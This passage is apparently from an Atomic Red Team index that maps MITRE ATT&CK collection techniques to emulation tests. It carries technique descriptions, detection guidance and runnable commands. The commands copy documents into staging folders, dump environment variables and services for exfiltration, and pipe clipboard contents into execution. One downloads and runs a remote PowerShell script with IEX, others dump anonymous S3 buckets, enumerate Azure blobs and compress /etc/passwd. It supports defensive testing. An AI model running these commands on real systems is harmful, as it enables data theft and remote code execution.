      id: attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619
      created: '2017-05-31T21:31:27.985Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1119
        url: https://attack.mitre.org/techniques/T1119
      x_mitre_deprecated: false
      revoked: false
      description: "Once established within a system or network, an adversary may
        use automated techniques for collecting internal data. Methods for performing
        this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)
        to search for and copy information fitting set criteria such as file type,
        location, or name at specific time intervals. In cloud-based environments,
        adversaries may also use cloud APIs, command line interfaces, or extract,
        transform, and load (ETL) services to automatically collect data. This functionality
        could also be built into remote access tools. \n\nThis technique may incorporate
        use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)
        and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to
        identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538)
        and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619)
        to identify resources in cloud environments."
      modified: '2022-04-11T18:40:24.795Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Automated Collection
      x_mitre_detection: Depending on the method used, actions could include common
        file system commands and parameters on the command-line interface within batch
        files or scripts. A sequence of actions like this may be unusual, depending
        on the system and network environment. Automated collection may occur along
        with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074).
        As such, file access monitoring that shows an unusual process performing sequential
        file opens and potentially copy actions to another location on the file system
        for many files at once may indicate automated collection behavior. Remote
        access tools with built-in features may interact directly with the Windows
        API to gather data. Data may also be acquired through Windows system management
        tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001), as well as
        through cloud APIs and command line interfaces.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Script: Script Execution'
      - 'Command: Command Execution'
      - 'File: File Access'
      x_mitre_system_requirements:
      - Permissions to access directories, files, and API endpoints that store information
        of interest.
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1119
    atomic_tests:
    - name: Automated Collection Command Prompt
      auto_generated_guid: cb379146-53f1-43e0-b884-7ce2c635ff5b
      description: |
        Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection
        to see what was collected.
      supported_platforms:
      - windows
      executor:
        command: |
          mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
          dir c: /b /s .docx | findstr /e .docx
          for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection
        cleanup_command: 'del %temp%\T1119_command_prompt_collection /F /Q >nul 2>&1

          '
        name: command_prompt
    - name: Automated Collection PowerShell
      auto_generated_guid: 634bd9b9-dc83-4229-b19f-7f83ba9ad313
      description: |
        Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection
        to see what was collected.
      supported_platforms:
      - windows
      executor:
        command: |
          New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
          Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
        cleanup_command: 'Remove-Item $env:TEMP\T1119_powershell_collection -Force
          -ErrorAction Ignore | Out-Null

          '
        name: powershell
    - name: Recon information for export with PowerShell
      auto_generated_guid: c3f6d794-50dd-482f-b640-0384fbb7db26
      description: |
        collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
        to see what was collected.
      supported_platforms:
      - windows
      executor:
        command: |
          Get-Service > $env:TEMP\T1119_1.txt
          Get-ChildItem Env: > $env:TEMP\T1119_2.txt
          Get-Process > $env:TEMP\T1119_3.txt
        cleanup_command: |
          Remove-Item $env:TEMP\T1119_1.txt -ErrorAction Ignore
          Remove-Item $env:TEMP\T1119_2.txt -ErrorAction Ignore
          Remove-Item $env:TEMP\T1119_3.txt -ErrorAction Ignore
        name: powershell
    - name: Recon information for export with Command Prompt
      auto_generated_guid: aa1180e2-f329-4e1e-8625-2472ec0bfaf3
      description: |
        collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
        to see what was collected.
      supported_platforms:
      - windows
      executor:
        command: |
          sc query type=service > %TEMP%\T1119_1.txt
          doskey /history > %TEMP%\T1119_2.txt
          wmic process list > %TEMP%\T1119_3.txt
          tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
        cleanup_command: |
          del %TEMP%\T1119_1.txt >nul 2>&1
          del %TEMP%\T1119_2.txt >nul 2>&1
          del %TEMP%\T1119_3.txt >nul 2>&1
          del %TEMP%\T1119_4.txt >nul 2>&1
        name: command_prompt
  T1115:
    technique:
      modified: '2023-04-14T21:51:47.277Z'
      name: Clipboard Data
      description: "Adversaries may collect data stored in the clipboard from users
        copying information within or between applications. \n\nFor example, on Windows
        adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation:
        MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally,
        adversaries may monitor then replace users clipboard with their data (e.g.,
        [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation:
        mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as
        <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with
        EmPyre)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_deprecated: false
      x_mitre_detection: Access to the clipboard is a legitimate function of many
        applications on an operating system. If an organization chooses to monitor
        for this behavior, then the data will likely need to be correlated against
        other suspicious or non-user-driven activity.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      type: attack-pattern
      id: attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f
      created: '2017-05-31T21:31:25.967Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1115
        external_id: T1115
      - source_name: CISA_AA21_200B
        description: 'CISA. (2021, August 20). Alert (AA21-200B) Chinese State-Sponsored
          Cyber Operations: Observed TTPs. Retrieved June 21, 2022.'
        url: https://www.cisa.gov/uscert/ncas/alerts/aa21-200b
      - source_name: mining_ruby_reversinglabs
        description: Maljic, T. (2020, April 16). Mining for malicious Ruby gems.
          Retrieved October 15, 2022.
        url: https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems
      - source_name: clip_win_server
        description: Microsoft, JasonGerend, et al. (2023, February 3). clip. Retrieved
          June 21, 2022.
        url: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/clip
      - source_name: MSDN Clipboard
        description: Microsoft. (n.d.). About the Clipboard. Retrieved March 29, 2016.
        url: https://msdn.microsoft.com/en-us/library/ms649012
      - source_name: Operating with EmPyre
        description: rvrsh3ll. (2016, May 18). Operating with EmPyre. Retrieved July
          12, 2017.
        url: https://medium.com/rvrsh3ll/operating-with-empyre-ea764eda3363
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1115
    atomic_tests:
    - name: Utilize Clipboard to store or execute commands from
      auto_generated_guid: 0cd14633-58d4-4422-9ede-daa2c9474ae7
      description: 'Add data to clipboard to copy off or execute commands from.

        '
      supported_platforms:
      - windows
      executor:
        command: |
          dir | clip
          echo "T1115" > %temp%\T1115.txt
          clip < %temp%\T1115.txt
        cleanup_command: 'del %temp%\T1115.txt >nul 2>&1

          '
        name: command_prompt
    - name: Execute Commands from Clipboard using PowerShell
      auto_generated_guid: d6dc21af-bec9-4152-be86-326b6babd416
      description: 'Utilize PowerShell to echo a command to clipboard and execute
        it

        '
      supported_platforms:
      - windows
      executor:
        command: |
          echo Get-Process | clip
          Get-Clipboard | iex
        name: powershell
    - name: Execute commands from clipboard
      auto_generated_guid: 1ac2247f-65f8-4051-b51f-b0ccdfaaa5ff
      description: Echo a command to clipboard and execute it
      supported_platforms:
      - macos
      executor:
        command: |-
          echo ifconfig | pbcopy
          $(pbpaste)
        name: bash
    - name: Collect Clipboard Data via VBA
      auto_generated_guid: 9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52
      description: 'This module copies the data stored in the user''s clipboard and
        writes it to a file, $env:TEMP\atomic_T1115_clipboard_data.txt

        '
      supported_platforms:
      - windows
      input_arguments:
        ms_product:
          description: Maldoc application Word
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"
        cleanup_command: 'Remove-Item "$env:TEMP\atomic_T1115_clipboard_data.txt"
          -ErrorAction Ignore

          '
        name: powershell
    - name: Add or copy content to clipboard with xClip
      auto_generated_guid: ee363e53-b083-4230-aff3-f8d955f2d5bb
      description: 'Utilize Linux Xclip to copy history and place in clipboard then
        output to a history.txt file. Successful execution will capture history and
        output to a file on disk.

        '
      supported_platforms:
      - linux
      executor:
        command: |
          apt install xclip -y
          history | tail -n 30 | xclip -sel clip
          xclip -o > history.txt
        name: sh
  T1530:
    technique:
      modified: '2022-10-18T19:10:42.621Z'
      name: Data from Cloud Storage Object
      description: "Adversaries may access data from improperly secured cloud storage.\n\nMany
        cloud service providers offer solutions for online data object storage such
        as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ
        from other storage solutions (such as SQL or Elasticsearch) in that there
        is no overarching application. Data from these solutions can be retrieved
        directly using the cloud provider's APIs. \n\nIn other cases, SaaS application
        providers such as Slack, Confluence, and Salesforce also provide cloud storage
        solutions as a peripheral use case of their platform. These cloud objects
        can be extracted directly from their associated application.(Citation: EA
        Hacked via Slack - June 2021)(Citation: SecureWorld - How Secure Is Your Slack
        Channel - Dec 2021)(Citation: HackerNews - 3 SaaS App Cyber Attacks - April
        2022)(Citation: Dark Clouds_Usenix_Mulazzani_08_2011)\n\nAdversaries may collect
        sensitive data from these cloud storage solutions. Providers typically offer
        security guides to help end users configure systems, though misconfigurations
        are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft
        Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices,
        2019) There have been numerous incidents where cloud storage has been improperly
        secured, typically by unintentionally allowing public access to unauthenticated
        users, overly-broad access by all users, or even access for any anonymous
        person outside the control of the Identity Access Management system without
        even needing basic user permissions.\n\nThis open access may expose various
        types of sensitive data, such as credit cards, personally identifiable information,
        or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation:
        Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation:
        Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked
        credentials from source repositories, logs, or other means as a way to gain
        access to cloud storage objects."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: Monitor for unusual queries to the cloud provider's storage
        service. Activity originating from unexpected sources may indicate improper
        permissions are set that is allowing access to data. Additionally, detecting
        failed attempts by a user for a certain object, followed by escalation of
        privileges by the same user, and access to the same object may be an indication
        of suspicious activity.
      x_mitre_platforms:
      - IaaS
      - SaaS
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '2.0'
      x_mitre_contributors:
      - Netskope
      - Praetorian
      - AppOmni
      x_mitre_data_sources:
      - 'Cloud Storage: Cloud Storage Access'
      type: attack-pattern
      id: attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7
      created: '2019-08-30T18:07:27.741Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1530
        external_id: T1530
      - source_name: SecureWorld - How Secure Is Your Slack Channel - Dec 2021
        description: " Drew Todd. (2021, December 28). How Secure Is Your Slack Channel?.
          Retrieved May 31, 2022."
        url: https://www.secureworld.io/industry-news/how-secure-is-your-slack-channel#:~:text=Electronic%20Arts%20hacked%20through%20Slack%20channel&text=In%20total%2C%20the%20hackers%20claim,credentials%20over%20a%20Slack%20channel.
      - source_name: Amazon S3 Security, 2019
        description: Amazon. (2019, May 17). How can I secure the files in my Amazon
          S3 bucket?. Retrieved October 4, 2019.
        url: https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/
      - source_name: Microsoft Azure Storage Security, 2019
        description: Amlekar, M., Brooks, C., Claman, L., et. al.. (2019, March 20).
          Azure Storage security guide. Retrieved October 4, 2019.
        url: https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide
      - source_name: EA Hacked via Slack - June 2021
        description: Anthony Spadafora. (2021, June 11). EA hack reportedly used stolen
          cookies and Slack to target gaming giant. Retrieved May 31, 2022.
        url: https://www.techradar.com/news/ea-hack-reportedly-used-stolen-cookies-and-slack-to-hack-gaming-giant
      - source_name: Wired Magecart S3 Buckets, 2019
        description: 'Barrett, B.. (2019, July 11). Hack Brief: A Card-Skimming Hacker
          Group Hit 17K Domainsand Counting. Retrieved October 4, 2019.'
        url: https://www.wired.com/story/magecart-amazon-cloud-hacks/
      - source_name: Google Cloud Storage Best Practices, 2019
        description: Google. (2019, September 16). Best practices for Cloud Storage.
          Retrieved October 4, 2019.
        url: https://cloud.google.com/storage/docs/best-practices
      - source_name: HackerNews - 3 SaaS App Cyber Attacks - April 2022
        description: 'Hananel Livneh. (2022, April 7). Into the Breach: Breaking Down
          3 SaaS App Cyber Attacks in 2022. Retrieved May 31, 2022.'
        url: https://thehackernews.com/2022/04/into-breach-breaking-down-3-saas-app.html
      - source_name: HIPAA Journal S3 Breach, 2017
        description: HIPAA Journal. (2017, October 11). 47GB of Medical Records and
          Test Results Found in Unsecured Amazon S3 Bucket. Retrieved October 4, 2019.
        url: https://www.hipaajournal.com/47gb-medical-records-unsecured-amazon-s3-bucket/
      - source_name: Rclone-mega-extortion_05_2021
        description: Justin Schoenfeld, Aaron Didier. (2021, May 4). Transferring
          leverage in a ransomware attack. Retrieved July 14, 2022.
        url: https://redcanary.com/blog/rclone-mega-extortion/
      - source_name: Dark Clouds_Usenix_Mulazzani_08_2011
        description: 'Martin Mulazzani, Sebastian Schrittwieser, Manuel Leithner,
          Markus Huber, and Edgar Weippl. (2011, August). Dark Clouds on the Horizon:
          Using Cloud Storage as Attack Vector and Online Slack Space. Retrieved July
          14, 2022.'
        url: https://www.usenix.org/conference/usenix-security-11/dark-clouds-horizon-using-cloud-storage-attack-vector-and-online-slack
      - source_name: Trend Micro S3 Exposed PII, 2017
        description: Trend Micro. (2017, November 6). A Misconfigured Amazon S3 Exposed
          Almost 50 Thousand PII in Australia. Retrieved October 4, 2019.
        url: https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/a-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1530
    atomic_tests:
    - name: Azure - Enumerate Azure Blobs with MicroBurst
      auto_generated_guid: 3dab4bcc-667f-4459-aea7-4162dd2d6590
      description: "Upon successful execution, this test will utilize a wordlist to
        enumerate the public facing containers and blobs of a specified Azure storage
        account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/
        . \n"
      supported_platforms:
      - iaas:azure
      input_arguments:
        base:
          description: Azure blob keyword to enumerate (Example, storage account name)
          type: string
          default: secure
        output_file:
          description: File to output results to
          type: string
          default: "$env:temp\\T1530Test1.txt"
        wordlist:
          description: File path to keywords for search permutations
          type: string
          default: "$env:temp\\permutations.txt"
      dependency_executor_name: powershell
      dependencies:
      - description: 'The Invoke-EnumerateAzureBlobs module must exist in $env:temp.

          '
        prereq_command: 'if (test-path $env:temp\Invoke-EnumerateAzureBlobs.ps1){exit
          0} else {exit 1}

          '
        get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1"
          -outfile "$env:temp\Invoke-EnumerateAzureBlobs.ps1"

          '
      - description: 'The wordlist file for search permutations must exist in $env:temp.

          '
        prereq_command: 'if (test-path #{wordlist}){exit 0} else {exit 1}

          '
        get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt"
          -outfile "#{wordlist}"

          '
      executor:
        command: |
          import-module "$env:temp\Invoke-EnumerateAzureBlobs.ps1"
          Invoke-EnumerateAzureBlobs -base #{base} -permutations #{wordlist} -outputfile "#{output_file}"
        cleanup_command: 'remove-item #{output_file} -erroraction silentlycontinue

          '
        name: powershell
    - name: Azure - Scan for Anonymous Access to Azure Storage (Powershell)
      auto_generated_guid: 146af1f1-b74e-4aa7-9895-505eb559b4b0
      description: "Upon successful execution, this test will test for anonymous access
        to Azure storage containers by invoking a web request and outputting the results
        to a file. \nThe corresponding response could then be interpreted to determine
        whether or not the resource/container exists, as well as other information.
        \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service
        \    \n"
      supported_platforms:
      - iaas:azure
      input_arguments:
        base_name:
          description: Azure storage account name to test
          type: string
          default: T1530Test2
        output_file:
          description: File to output results to
          type: string
          default: "$env:temp\\T1530Test2.txt"
        container_name:
          description: Container name to search for (optional)
          type: string
          default: 
        blob_name:
          description: Blob name to search for (optional)
          type: string
          default: 
      executor:
        command: |
          try{$response = invoke-webrequest "https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}" -method "GET"}
          catch [system.net.webexception]
          {if($_.Exception.Response -ne $null)
          {$Response = $_.Exception.Response.GetResponseStream()
          $ReadResponse = New-Object System.IO.StreamReader($Response)
          $ReadResponse.BaseStream.Position = 0
          $responseBody = $ReadResponse.ReadToEnd()}
          else {$responseBody = "The storage account could not be anonymously accessed."}}
          "Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody" | out-file -filepath #{output_file} -append
        cleanup_command: 'remove-item #{output_file} -erroraction silentlycontinue

          '
        name: powershell
    - name: AWS - Scan for Anonymous Access to S3
      auto_generated_guid: 979356b9-b588-4e49-bba4-c35517c484f5
      description: "Upon successful execution, this test will test for anonymous access
        to AWS S3 buckets and dumps all the files to a local folder. \n"
      supported_platforms:
      - iaas:aws
      input_arguments:
        s3_bucket_name:
          description: Name of the bucket
          type: string
          default: redatomic-test2
      dependencies:
      - description: 'Check if ~/.aws/credentials file has a default stanza is configured

          '
        prereq_command: |
          cat ~/.aws/credentials | grep "default"
          aws s3api create-bucket --bucket #{s3_bucket_name}
          aws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1530/src/policy.json
          touch /tmp/T1530.txt
          aws s3 cp /tmp/T1530.txt s3://#{s3_bucket_name}
        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
          default profile using: aws configure

          '
      executor:
        command: 'aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}

          '
        cleanup_command: "aws s3 rb s3://#{s3_bucket_name} --force \nrm -rf /tmp/#{s3_bucket_name}\n"
        name: sh
        elevation_required: false
  T1074.002:
    technique:
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Praetorian
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0
      type: attack-pattern
      created: '2020-03-13T21:14:58.206Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1074.002
        url: https://attack.mitre.org/techniques/T1074/002
      - source_name: Mandiant M-Trends 2020
        url: https://content.fireeye.com/m-trends/rpt-m-trends-2020
        description: Mandiant. (2020, February). M-Trends 2020. Retrieved April 24,
          2020.
      modified: '2021-03-08T10:33:02.019Z'
      name: Remote Data Staging
      description: |-
        Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.

        In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

        By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: |-
        Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.

        Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Creation'
      - 'Command: Command Execution'
      - 'File: File Access'
    atomic_tests: []
  T1005:
    technique:
      modified: '2023-04-12T23:54:39.466Z'
      name: Data from Local System
      description: |
        Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.

        Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_contributors:
      - William Cain
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: "Monitor processes and command-line arguments for actions
        that could be taken to collect files from a system. Remote access tools with
        built-in features may interact directly with the Windows API to gather data.
        Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
        commands may also be used to collect files such as configuration files with
        built-in features native to the network device platform.(Citation: Mandiant
        APT41 Global Intrusion )(Citation: US-CERT-TA18-106A) Monitor CLI activity
        for unexpected or unauthorized use commands being run by non-standard users
        from non-standard locations. Data may also be acquired through Windows system
        management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
        and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network
        infrastructure devices, collect AAA logging to monitor `show` commands that
        view configuration files. "
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.6'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'File: File Access'
      - 'Script: Script Execution'
      - 'Process: OS API Execution'
      x_mitre_system_requirements:
      - Privileges to access certain files and directories
      type: attack-pattern
      id: attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5
      created: '2017-05-31T21:30:20.537Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1005
        external_id: T1005
      - source_name: show_run_config_cmd_cisco
        description: Cisco. (2022, August 16). show running-config - Cisco IOS Configuration
          Fundamentals Command Reference . Retrieved July 13, 2022.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_protocols_through_showmon.html#wp2760878733
      - source_name: 'Mandiant APT41 Global Intrusion '
        description: 'Gyler, C.,Perez D.,Jones, S.,Miller, S.. (2021, February 25).
          This is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple
          Exploits. Retrieved February 17, 2022.'
        url: https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits
      - source_name: US-CERT-TA18-106A
        description: US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored
          Cyber Actors Targeting Network Infrastructure Devices. Retrieved October
          19, 2020.
        url: https://www.us-cert.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1560.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6
      type: attack-pattern
      created: '2020-02-20T21:08:52.529Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1560.002
        url: https://attack.mitre.org/techniques/T1560/002
      - source_name: PyPI RAR
        url: https://pypi.org/project/rarfile/
        description: mkz. (2020). rarfile 3.1. Retrieved February 20, 2020.
      - source_name: libzip
        url: https://libzip.org/
        description: D. Baron, T. Klausner. (2020). libzip. Retrieved February 20,
          2020.
      - source_name: Zlib Github
        url: https://github.com/madler/zlib
        description: madler. (2017). zlib. Retrieved February 20, 2020.
      - url: https://en.wikipedia.org/wiki/List_of_file_signatures
        description: Wikipedia. (2016, March 31). List of file signatures. Retrieved
          April 22, 2016.
        source_name: Wikipedia File Header Signatures
      modified: '2020-03-29T18:27:30.891Z'
      name: 'Archive Collected Data: Archive via Library'
      description: |-
        An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.

        Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: collection
      x_mitre_detection: |-
        Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.

        Consider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Script: Script Execution'
      - 'File: File Creation'
      identifier: T1560.002
    atomic_tests:
    - name: Compressing data using GZip in Python (Linux)
      auto_generated_guid: 391f5298-b12d-4636-8482-35d9c17d53a8
      description: 'Uses GZip from Python to compress files

        '
      supported_platforms:
      - linux
      input_arguments:
        path_to_input_file:
          description: Path to the file that you want to compress
          type: path
          default: "/etc/passwd"
        path_to_output_file:
          description: Path of the file that you want your .gz file to be
          type: path
          default: "/tmp/passwd.gz"
      dependency_executor_name: bash
      dependencies:
      - description: 'Requires Python

          '
        prereq_command: 'which python || which python3

          '
        get_prereq_command: 'echo "please install python to run this test"; exit 1

          '
      executor:
        name: bash
        elevation_required: false
        command: |
          which_python=`which python || which python3`
          $which_python -c "import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();"
        cleanup_command: 'rm #{path_to_output_file}

          '
    - name: Compressing data using bz2 in Python (Linux)
      auto_generated_guid: c75612b2-9de0-4d7c-879c-10d7b077072d
      description: 'Uses bz2 from Python to compress files

        '
      supported_platforms:
      - linux
      input_arguments:
